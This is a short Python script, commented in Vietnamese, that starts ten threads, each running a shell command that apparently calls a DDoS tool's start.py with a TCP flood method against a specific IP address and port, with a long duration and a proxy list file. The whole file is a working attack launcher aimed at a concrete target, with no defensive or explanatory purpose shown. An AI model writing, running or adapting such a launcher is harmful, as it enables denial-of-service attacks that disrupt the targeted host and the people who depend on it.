import subprocess
import threading

# Hàm thực hiện chạy câu lệnh trong luồng
def run_command(command):
    subprocess.call(command, shell=True)

# Câu lệnh muốn thực hiện
command = 'python3 start.py TCP 14.225.255.190:14445 80 600000 0 http.txt DEBUG'

# Số lượng luồng muốn chạy
num_threads = 10

# Tạo và chạy các luồng
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=run_command, args=(command,))
    thread.start()
    threads.append(thread)

# Chờ cho tất cả các luồng hoàn thành
for thread in threads:
    thread.join()